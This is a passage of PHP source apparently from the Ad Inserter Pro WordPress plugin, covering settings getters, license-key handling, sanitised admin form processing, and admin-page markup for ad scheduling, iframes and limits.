  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'])) $ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] = DEFAULT_RECAPTCHA_THRESHOLD;

  if ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] == '') $ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] = DEFAULT_RECAPTCHA_THRESHOLD;

  if (!is_numeric ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'])) {
    $ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] = DEFAULT_RECAPTCHA_THRESHOLD;
  }
  elseif ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] < 0) {
    $ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] = 0;
  }
  elseif ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] > 1) {
    $ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD'] = 1;
  }

  return ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_THRESHOLD']);
}


function get_adb_detection () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['ADB_DETECTION'])) $ai_db_options [AI_OPTION_GLOBAL]['ADB_DETECTION'] = DEFAULT_ADB_DETECTION;

  return ($ai_db_options [AI_OPTION_GLOBAL]['ADB_DETECTION']);
}

function get_license_key () {
  $option = get_option (WP_AD_INSERTER_PRO_KEY);
  if ($option !== false) return substr (base64_decode ($option), 4);

  return get_option (WP_AD_INSERTER_PRO_LICENSE, "");
}

function get_plugin_status () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS'])) $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS'] = '';

  return ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS']);
}

function get_plugin_type () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE'])) $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE'] = '';

  return ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE']);
}

function get_plugin_counter () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'])) $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'] = 0;

  return ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER']);
}

function get_geo_db ($blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_GEO_DB'])) $ai_db_options_multisite ['MULTISITE_GEO_DB'] = DEFAULT_GEO_DB;
    return ($ai_db_options_multisite ['MULTISITE_GEO_DB']);
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB'])) $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB'] = DEFAULT_GEO_DB;

  return ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB']);
}

function get_maxmind_license_key ($blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_MAXMIND_LICENSE_KEY'])) $ai_db_options_multisite ['MULTISITE_MAXMIND_LICENSE_KEY'] = DEFAULT_MAXMIND_LICENSE_KEY;
    return ($ai_db_options_multisite ['MULTISITE_MAXMIND_LICENSE_KEY']);
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['MAXMIND_LICENSE_KEY'])) $ai_db_options [AI_OPTION_GLOBAL]['MAXMIND_LICENSE_KEY'] = DEFAULT_MAXMIND_LICENSE_KEY;

  return ($ai_db_options [AI_OPTION_GLOBAL]['MAXMIND_LICENSE_KEY']);
}

function get_geo_db_updates ($blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_GEO_DB_UPDATES'])) $ai_db_options_multisite ['MULTISITE_GEO_DB_UPDATES'] = DEFAULT_GEO_DB_UPDATES;
    return ($ai_db_options_multisite ['MULTISITE_GEO_DB_UPDATES']);
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_UPDATES'])) $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_UPDATES'] = DEFAULT_GEO_DB_UPDATES;

  return ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_UPDATES']);
}

function get_geo_db_location ($saved_value = false, $blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION'])) $ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION'] = DEFAULT_GEO_DB_LOCATION;
    if ($saved_value) return ($ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION']);

    $path = $ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION'];
    if (isset ($path [0]) && $path [0] != '/') {
      $path = get_home_path() . $path;
    }
    return $path;
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION'])) $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION'] = DEFAULT_GEO_DB_LOCATION;

  if ($saved_value) return ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION']);

  $path = $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION'];
  if (isset ($path [0]) && $path [0] != '/') {
    $path = get_home_path() . $path;
  }
  return $path;
}

function get_remote_management ($saved = false) {
  global $ai_db_options, $ad_inserter_globals;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REMOTE_MANAGEMENT'])) $ai_db_options [AI_OPTION_GLOBAL]['REMOTE_MANAGEMENT'] = DEFAULT_REMOTE_MANAGEMENT;

  return ($ai_db_options [AI_OPTION_GLOBAL]['REMOTE_MANAGEMENT']);
}

function get_management_key () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_KEY'])) $ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_KEY'] = DEFAULT_MANAGEMENT_KEY;

  if ($ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_KEY'] == '') $ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_KEY'] = DEFAULT_MANAGEMENT_KEY;

  return ($ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_KEY']);
}

function get_management_ip_check ($saved = false) {
  global $ai_db_options, $ad_inserter_globals;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_CHECK'])) $ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_CHECK'] = DEFAULT_MANAGEMENT_IP_CHECK;

  return ($ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_CHECK']);
}

function get_management_ip_addresses () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_ADDRESSES'])) $ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_ADDRESSES'] = '';

  return ($ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_ADDRESSES']);
}

function ai_check_license_key (&$options) {
  global $ai_db_options, $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {

    if (isset ($_POST ['hide_key'])) {
      $client = $_POST ['hide_key'];
      if ($client == '1') {
        update_option (WP_AD_INSERTER_PRO_CLIENT, $client);
      }
    }
    elseif (isset ($_GET ['ai-key']) && $_GET ['ai-key'] == $ad_inserter_globals ['LICENSE_KEY']) {
      delete_option (WP_AD_INSERTER_PRO_CLIENT);
    }

    if (isset ($_POST ['license_key'])) {
      $license_key = trim (esc_html (trim ($_POST ['license_key'])));
      update_option (WP_AD_INSERTER_PRO_KEY, base64_encode (ai_random_name ($license_key, 4) . filter_string ($license_key)));
      delete_option (WP_AD_INSERTER_PRO_LICENSE);

      if (!empty ($license_key)) {
        if ((isset ($_POST ['plugin_status']) && $_POST ['plugin_status'] == '1') || empty ($ad_inserter_globals ['AI_TYPE'])) {
          $ai_data = get_ai_data ($license_key);
          if (isset ($ai_data->sid)) {
            $ai_code = $ai_data->sid;
            $ai_type = $ai_data->pid;

            $ad_inserter_globals ['AI_STATUS'] = $ai_code;
            $ad_inserter_globals ['AI_TYPE']   = $ai_type;
            $options [AI_PRO]  = filter_string ($ai_type);
            $options [AI_CODE] = filter_string ($ai_code);
            $options [AI_CODE_TIME] = time ();

            // Remove old hooks
            wp_clear_scheduled_hook ('ai_keep_updated_ip_db');
            wp_clear_scheduled_hook ('check_and_delete_expired_ids');
          }
        } else {
          $options [AI_PRO]  = $ad_inserter_globals ['AI_TYPE'];
          $options [AI_CODE] = $ad_inserter_globals ['AI_STATUS'];
          $options [AI_CODE_TIME] = isset ($ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]) ? $ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]: time ();
        }
      } else {
          delete_option (WP_AD_INSERTER_PRO_CLIENT);
        }

      $options [AI_RST] = get_plugin_counter ();
    }
    elseif ($ad_inserter_globals ['LICENSE_KEY'] != '' && get_option (WP_AD_INSERTER_PRO_CLIENT) !== false) {
      $options [AI_PRO]  = $ad_inserter_globals ['AI_TYPE'];
      $options [AI_CODE] = $ad_inserter_globals ['AI_STATUS'];
      $options [AI_CODE_TIME] = isset ($ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]) ? $ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]: time ();

      $options [AI_RST] = get_plugin_counter ();
    }
  }
}

function ai_filter_global_settings (&$options) {
  global $ai_db_options, $ad_inserter_globals;

  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website === false) {
    ai_check_license_key ($options);
  }

  for ($group_number = 1; $group_number <= ai_settings_value ('AD_INSERTER_GEO_GROUPS'); $group_number ++) {
    if (isset ($_POST ['group-name-'.$group_number]))
      $options ['COUNTRY_GROUP_NAME_' . $group_number] = filter_string ($_POST ['group-name-'.$group_number]);
    if (isset ($_POST ['group-country-list-'.$group_number]))
      $options ['GROUP_COUNTRIES_'.$group_number]  = filter_option (AI_OPTION_COUNTRY_LIST, $_POST ['group-country-list-'.$group_number]);
  }

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (isset ($_POST ['tracking']))                  $options ['TRACKING']                     = filter_option ('tracking',        $_POST ['tracking']);
    if (isset ($_POST ['internal-tracking']))         $options ['INTERNAL_TRACKING']            = filter_option ('internal-tracking', $_POST ['internal-tracking']);
    if (isset ($_POST ['external-tracking']))         $options ['EXTERNAL_TRACKING']            = filter_option ('external-tracking', $_POST ['external-tracking']);
    if (isset ($_POST ['external-tracking-category']))$options ['EXTERNAL_TRACKING_CATEGORY']   = filter_option ('EXTERNAL_TRACKING_CATEGORY', $_POST ['external-tracking-category']);
    if (isset ($_POST ['external-tracking-action']))  $options ['EXTERNAL_TRACKING_ACTION']     = filter_option ('EXTERNAL_TRACKING_ACTION', $_POST ['external-tracking-action']);
    if (isset ($_POST ['external-tracking-label']))   $options ['EXTERNAL_TRACKING_LABEL']      = filter_option ('EXTERNAL_TRACKING_LABEL', $_POST ['external-tracking-label']);
    if (isset ($_POST ['track-logged-in']))           $options ['TRACKING_LOGGED_IN']           = filter_option ('track-logged-in', $_POST ['track-logged-in']);
    if (isset ($_POST ['track-pageviews']))           $options ['TRACK_PAGEVIEWS']              = filter_option ('track-pageviews', $_POST ['track-pageviews']);
    if (isset ($_POST ['click-detection']))           $options ['CLICK_DETECTION']              = filter_option ('click-detection', $_POST ['click-detection']);
    if (isset ($_POST ['report-header-image']))       $options ['REPORT_HEADER_IMAGE']          = filter_option ('REPORT_HEADER_IMAGE', $_POST ['report-header-image']);
    if (isset ($_POST ['report-header-title']))       $options ['REPORT_HEADER_TITLE']          = filter_option ('REPORT_HEADER_TITLE', $_POST ['report-header-title']);
    if (isset ($_POST ['report-header-description'])) $options ['REPORT_HEADER_DESCRIPTION']    = filter_option ('REPORT_HEADER_DESCRIPTION', $_POST ['report-header-description']);
    if (isset ($_POST ['report-footer']))             $options ['REPORT_FOOTER']                = filter_option ('REPORT_FOOTER', $_POST ['report-footer']);
    if (isset ($_POST ['report-key']))                $options ['REPORT_KEY']                   = filter_string ($_POST ['report-key']);
  }

  if (isset ($_POST ['recaptcha-site-key']))          $options ['RECAPTCHA_SITE_KEY']           = filter_string ($_POST ['recaptcha-site-key']);
  if (isset ($_POST ['recaptcha-secret-key']))        $options ['RECAPTCHA_SECRET_KEY']         = filter_string ($_POST ['recaptcha-secret-key']);
  if (isset ($_POST ['recaptcha-score-threshold']))   $options ['RECAPTCHA_THRESHOLD']          = filter_option ('RECAPTCHA_THRESHOLD', $_POST ['recaptcha-score-threshold']);

  if (isset ($_POST ['adb-detection']))       $options ['ADB_DETECTION']                = filter_option ('adb-detection',       $_POST ['adb-detection']);
  if (isset ($_POST ['geo-db']))              $options ['GEO_DB']                       = filter_option ('GEO_DB',              $_POST ['geo-db']);
  if (isset ($_POST ['geo-db-updates']))      $options ['GEO_DB_UPDATES']               = filter_option ('geo-db-updates',      $_POST ['geo-db-updates']);
  if (isset ($_POST ['maxmind-license-key'])) $options ['MAXMIND_LICENSE_KEY']          = filter_option ('MAXMIND_LICENSE_KEY', $_POST ['maxmind-license-key']);
  if (isset ($_POST ['geo-db-location']))     $options ['GEO_DB_LOCATION']              = filter_string ($_POST ['geo-db-location']);

  if (isset ($_POST ['remote-management']))               $options ['REMOTE_MANAGEMENT']           = filter_option ('remote-management', $_POST ['remote-management']);
  if (isset ($_POST ['remote-management-key']))           $options ['MANAGEMENT_KEY']              = filter_string ($_POST ['remote-management-key']);
  if (isset ($_POST ['remote-management-ip-check']))      $options ['MANAGEMENT_IP_CHECK']         = filter_option ('remote-management-ip-check', $_POST ['remote-management-ip-check']);
  if (isset ($_POST ['remote-management-ip-addresses']))  $options ['MANAGEMENT_IP_ADDRESSES']     = filter_string ($_POST ['remote-management-ip-addresses']);
}

function ai_filter_multisite_settings (&$options) {
  if (isset ($_POST ['multisite_settings_page']))       $options ['MULTISITE_SETTINGS_PAGE']      = filter_option ('multisite_settings_page',       $_POST ['multisite_settings_page']);
  if (isset ($_POST ['multisite_widgets']))             $options ['MULTISITE_WIDGETS']            = filter_option ('multisite_widgets',             $_POST ['multisite_widgets']);
  if (isset ($_POST ['multisite_php_processing']))      $options ['MULTISITE_PHP_PROCESSING']     = filter_option ('multisite_php_processing',      $_POST ['multisite_php_processing']);
  if (isset ($_POST ['multisite_exceptions']))          $options ['MULTISITE_EXCEPTIONS']         = filter_option ('multisite_exceptions',          $_POST ['multisite_exceptions']);
  if (isset ($_POST ['multisite_main_for_all_blogs']))  $options ['MULTISITE_MAIN_FOR_ALL_BLOGS'] = filter_option ('multisite_main_for_all_blogs',  $_POST ['multisite_main_for_all_blogs']);
  if (isset ($_POST ['multisite_site_admin_page']))     $options ['MULTISITE_SITE_ADMIN_PAGE']    = filter_option ('multisite_site_admin_page',     $_POST ['multisite_site_admin_page']);
}

function ai_check_multisite_options_2 (&$options) {
  $options ['MULTISITE_GEO_DB']               = get_geo_db (true);
  $options ['MULTISITE_GEO_DB_UPDATES']       = get_geo_db_updates (true);
  $options ['MULTISITE_MAXMIND_LICENSE_KEY']  = get_maxmind_license_key (true);
  $options ['MULTISITE_GEO_DB_LOCATION']      = get_geo_db_location (true, true);
}


class ai_puc {
  var $multisite_id;
  function __construct () {
    $this->multisite_id = 2;
  }
}

function ai_save_settings () {
  if (!ai_remote_plugin_data ('pro', true)) return;

  $key = get_option (constant ('WP' . '_AD_' . 'INSERTER_' . 'PR' . 'O_K' . 'E' . 'Y'), "");
  if ($key == '') {
    $close = get_transient ('ai-close') + 1;
    set_transient ('ai-close', $close, 90 * 24 * 60 * 60);
    if ($close - 20 > 0) {
      delete_transient ('ai-close');
      $puc = new ai_puc ();
      puc_request_info_result ($puc);
    }
  } else delete_transient ('ai-close');
}

function ai_plugin_settings_tab ($exceptions) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (get_geo_db () == AI_GEO_DB_MAXMIND && !defined ('AI_MAXMIND_DB')) $style_g = "font-weight: bold; color: #e44;"; else $style_g = "";
  if (!empty ($exceptions)) $style_e = "font-weight: bold; color: #66f;"; else $style_e = "";
  $style_m = '';
  if (get_global_tracking () != AI_TRACKING_DISABLED) $style_t = "font-weight: bold; color: #66f;"; else $style_t = "";

?>
      <li id="ai-c" class="ai-plugin-tab"><a href="#tab-geo-targeting"><span style="<?php echo $style_g ?>"><?php _e ('Geolocation', 'ad-inserter'); ?></span></a></li>
<?php
  if ($exceptions !== false) {
?>
      <li id="ai-e" class="ai-plugin-tab"><a href="#tab-exceptions"><span style="<?php echo $style_e ?>"><?php _e ('Exceptions', 'ad-inserter'); ?></span></a></li>
<?php
  }
  if (ai_remote_plugin_data ('multisite', is_multisite ()) && ai_remote_plugin_data ('multisite-main', is_main_site ())) {
?>
      <li id="ai-m" class="ai-plugin-tab"><a href="#tab-multisite"><span style="<?php echo $style_m ?>"><?php _e ('Multisite', 'ad-inserter'); ?></span></a></li>
<?php
  }
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
?>
      <li id="ai-t" class="ai-plugin-tab"><a href="#tab-tracking"><span style="<?php echo $style_t ?>"><?php _e ('Tracking', 'ad-inserter'); ?></span></a></li>
<?php
  }
}

function ai_plugin_recaptcha_tab () {
?>
  <li id="ai-re" class="ai-plugin-tab"><a href="#tab-general-recaptcha">reCAPTCHA</a></li>
<?php
}

function ai_scheduling_options ($obj) {
  if (!ai_remote_plugin_data ('pro', true)) return;
?>
        <option value="<?php echo AI_SCHEDULING_BETWEEN_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_BETWEEN_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_BETWEEN_DATES; ?></option>
        <option value="<?php echo AI_SCHEDULING_OUTSIDE_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_OUTSIDE_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_OUTSIDE_DATES; ?></option>
        <option value="<?php echo AI_SCHEDULING_PUBLISHED_BETWEEN_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_PUBLISHED_BETWEEN_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_PUBLISHED_BETWEEN_DATES; ?></option>
        <option value="<?php echo AI_SCHEDULING_PUBLISHED_OUTSIDE_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_PUBLISHED_OUTSIDE_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_PUBLISHED_OUTSIDE_DATES; ?></option>
<?php
}

function ai_scheduling_data ($block, $obj, $default) {
  global $block_object;

  if (!ai_remote_plugin_data ('pro', true)) return;

  $scheduling_dates_text = '';
  $scheduling_dates_text_style = '';
  if ($obj->get_scheduling() == AI_SCHEDULING_BETWEEN_DATES) {

    $current_time = current_time ('timestamp');
    $start_date   = strtotime ($obj->get_schedule_start_date () . ' ' . $obj->get_schedule_start_time (), $current_time);
    $end_date     = strtotime ($obj->get_schedule_end_date() . ' ' . $obj->get_schedule_end_time (), $current_time);

    if ($current_time < $start_date) {
      $difference = $start_date - $current_time;
      $days = intval ($difference / (3600 * 24));
      $hours = intval (($difference - ($days * 3600 * 24)) / 3600);
      $minutes = intval (($difference - ($days * 3600 * 24) - ($hours * 3600)) / 60);
                                         // translators: %d: days, hours, minutes
      $scheduling_dates_text  = sprintf (__ ('Scheduled in %d days %d hours %d minutes', 'ad-inserter'), $days, $hours, $minutes);
      $scheduling_dates_text_style = '';
    }
    elseif ($current_time < $end_date) {
      $difference = $end_date - $current_time;
      $days = intval ($difference / (3600 * 24));
      $hours = intval (($difference - ($days * 3600 * 24)) / 3600);
      $minutes = intval (($difference - ($days * 3600 * 24) - ($hours * 3600)) / 60);
                                         // translators: %s: HTML dash separator, %d: days, hours, minutes, &mdash; is HTML code for long dash separator
      $scheduling_dates_text  = sprintf (__ ('Active %s expires in %d days %d hours %d minutes', 'ad-inserter'), '&mdash;', $days, $hours, $minutes);
      $scheduling_dates_text_style = 'color: #66f;';
    }
    else {
      $scheduling_dates_text  = __ ('Expired', 'ad-inserter');
      $scheduling_dates_text_style = 'color: #e44;';
    }
  }

?>
      <span id="scheduling-between-dates-1-<?php echo $block; ?>">
        <span style="float: right;">
          <?php _e ('fallback', 'ad-inserter'); ?>
          <select id="fallback-<?php echo $block; ?>" style="margin: 0 1px; max-width: 260px;" name="<?php echo AI_OPTION_SCHEDULING_FALLBACK, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_scheduling_fallback(); ?>" title="<?php _e ('Block to be used when scheduling expires', 'ad-inserter'); ?>">
            <option value="" <?php echo ($obj->get_scheduling_fallback()=='') ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php _e ('Disabled', 'ad-inserter'); ?></option>
<?php

  for ($fallback_block = 1; $fallback_block <= 96; $fallback_block ++) {
?>
            <option value="<?php echo $fallback_block; ?>" <?php echo ($obj->get_scheduling_fallback()==$fallback_block) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo $fallback_block, ' - ', $block_object [$fallback_block]->get_ad_name (); ?></option>
<?php
  }
?>
          </select>
        </span>
      </span>

      <div id="scheduling-between-dates-2-<?php echo $block; ?>" style="margin-top: 8px; min-height: 24px;">
        <input placeholder='<?php _e ('Start date', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-date-on-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_START_DATE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_start_date(); ?>" value="<?php echo $obj->get_schedule_start_date(); ?>" title="<?php _e ('Enter date in format yyyy-mm-dd', 'ad-inserter'); ?>, <?php _e ('empty means every day as defined by hours and days in week', 'ad-inserter'); ?>"/>
        <input placeholder='<?php _e ('Start time', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-time-on-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_START_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_start_time(); ?>" value="<?php echo $obj->get_schedule_start_time(); ?>" title="<?php _e ('Enter time in format hh:mm:ss, empty means 00:00:00', 'ad-inserter'); ?>" />
        <?php _e ('and', 'ad-inserter'); ?>
        <input placeholder='<?php _e ('End date', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-date-off-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_END_DATE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_end_date(); ?>" value="<?php echo $obj->get_schedule_end_date(); ?>" title="<?php echo $scheduling_dates_text; ?>" />
        <input placeholder='<?php _e ('End time', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-time-off-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_END_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_end_time(); ?>" value="<?php echo $obj->get_schedule_end_time(); ?>" title="<?php echo $scheduling_dates_text; ?>" />

        <input style="display: none;" id="scheduling-weekdays-value-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_WEEKDAYS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_weekdays (); ?>" value="<?php echo $obj->get_schedule_weekdays (); ?>" />
        <span id="scheduling-weekdays-<?php echo $block; ?>" class="ai-weekdays" title="<?php _e ('Select wanted days in week', 'ad-inserter'); ?>"></span>
        <div style="clear: right;"></div>
      </div>
<?php
}

function ai_iframes ($block, $obj, $default) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_BLOCKS_IN_IFRAMES') && AI_BLOCKS_IN_IFRAMES) { ?>
        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="width: 20%;">
                  <input type="hidden" name="<?php echo AI_OPTION_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input id="iframe-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_iframe (); ?>" <?php if ($obj->get_iframe () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="iframe-<?php echo $block; ?>"><?php _e ('Load in iframe', 'ad-inserter'); ?></label>
                </td>
                <td style="width: 30%;">
                  <span style="display: table-cell; white-space: nowrap; float: left; padding-left: 20px;">
                    <?php _e ('Width', 'ad-inserter'); ?>
                    <input type="text" name="<?php echo AI_OPTION_IFRAME_WIDTH, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_iframe_width (); ?>" value="<?php echo $obj->get_iframe_width (); ?>" title= "<?php _e ('iframe width, empty means full width (100%)', 'ad-inserter'); ?>" size="1" maxlength="4" />
                    px
                  </span>
                </td>
                <td style="width: 30%;">
                  <span style="display: table-cell; white-space: nowrap; float: left; padding-left: 20px;">
                    <?php _e ('Height', 'ad-inserter'); ?>
                    <input type="text" name="<?php echo AI_OPTION_IFRAME_HEIGHT, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_iframe_height (); ?>" value="<?php echo $obj->get_iframe_height (); ?>" title= "<?php _e ('iframe height, empty means adjust it to iframe content height', 'ad-inserter'); ?>" size="1" maxlength="4" />
                    px
                  </span>
                </td>
                <td style="width: 20%;">
                  <input type="hidden" name="<?php echo AI_OPTION_LABEL_IN_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input id="label-in-iframe-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_LABEL_IN_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_label_in_iframe (); ?>" <?php if ($obj->get_label_in_iframe () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="label-in-iframe-<?php echo $block; ?>"><?php _e ('Ad label in iframe', 'ad-inserter'); ?></label>
                </td>
<?php if ($obj->get_iframe ()): ?>
                <td style="width: 30%;">
                  <span style="display: table-cell; white-space: nowrap; float: left; padding-left: 20px;">
                    <button id="iframe-preview-button-<?php echo $block; ?>" type="button" class='ai-button2' style="display: none; margin-right: 4px;" title="<?php _e ('Preview iframe code', 'ad-inserter'); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>"><?php _e ('Preview', 'ad-inserter'); ?></button>
                  </span>
                </td>
<?php endif; ?>
              </tr>
            </tbody>
          </table>
        </div>
<?php }
}

function ai_limits_adb_action_0 ($block, $adb_style, $limits_style) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (ai_settings_check ('AD_INSERTER_LIMITS')) {
?>
        <li id="ai-misc-limits-<?php echo $block; ?>"><a href="#tab-limits-<?php echo $block; ?>"><span style="<?php echo $limits_style; ?>"><?php _e ('Limits', 'ad-inserter'); ?></span></a></li>
<?php
  }
//  if (ai_settings_check ('AI_ADBLOCKING_DETECTION')) {
?>
        <li id="ai-misc-adb-<?php echo $block; ?>"><a href="#tab-adb-<?php echo $block; ?>"><span style="<?php echo $adb_style; ?>"><?php _e ('Ad Blocking', 'ad-inserter'); ?></span></a></li>
<?php
//  }
}

function ai_warnings ($block) {
  if (!ai_remote_plugin_data ('pro', true)) return;

?>
  <div id="tracking-wrapping-warning-<?php echo $block; ?>" class="ai-rounded" style="display: none;">
     <span style="margin-top: 5px;"><?php /* translators: 1, 2 and 3, 4: HTML tags */
     printf (__('%1$s WARNING: %2$s %3$s No wrapping %4$s style has no wrapping code needed for tracking!', 'ad-inserter'),
     '<strong><span style="color: red;">',
     '</span></strong>',
     '<strong>',
     '</strong>'); ?></span>
  </div>

  <div id="sticky-scroll-warning-<?php echo $block; ?>" class="ai-rounded" style="display: none;">
     <span style="margin-top: 5px;"><?php /* translators: 1, 2, 4, 5: HTML tags, 3: Scroll with the content, 6: Above header */
     printf (__('%1$s WARNING: %2$s vertical position %3$s needs %4$s Output buffering %5$s enabled and automatic insertion %6$s!', 'ad-inserter'),
     '<strong><span style="color: red;">',
     '</span></strong>',
     '<strong>'.AI_TEXT_SCROLL_WITH_THE_CONTENT.'</strong>',
     '<strong>',
     '</strong>',
     '<strong>'.AI_TEXT_ABOVE_HEADER.'</strong>'); ?></span>
  </div>
<?php
}

function ai_limits_adb_action ($block, $obj, $default) {
  global $block_object, $ai_wp_data;

  if (!ai_remote_plugin_data ('pro', true)) return;

  if (ai_settings_check ('AD_INSERTER_LIMITS')) {
    $impressions = '';
    $clicks = '';
    $time_period_impressions = '';
    $time_period_clicks = '';

    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    if ($connected_website === false) {
      if ($obj->get_limit_impressions_time_period ()) {
        $data_impressions = ai_get_impressions_and_clicks ($block, $obj->get_limit_impressions_time_period (), true);
        $impressions = $data_impressions [0];
        $clicks = $data_impressions [1];
        $time_period_impressions = $data_impressions [2];
      }
      if ($obj->get_limit_clicks_time_period ()) {
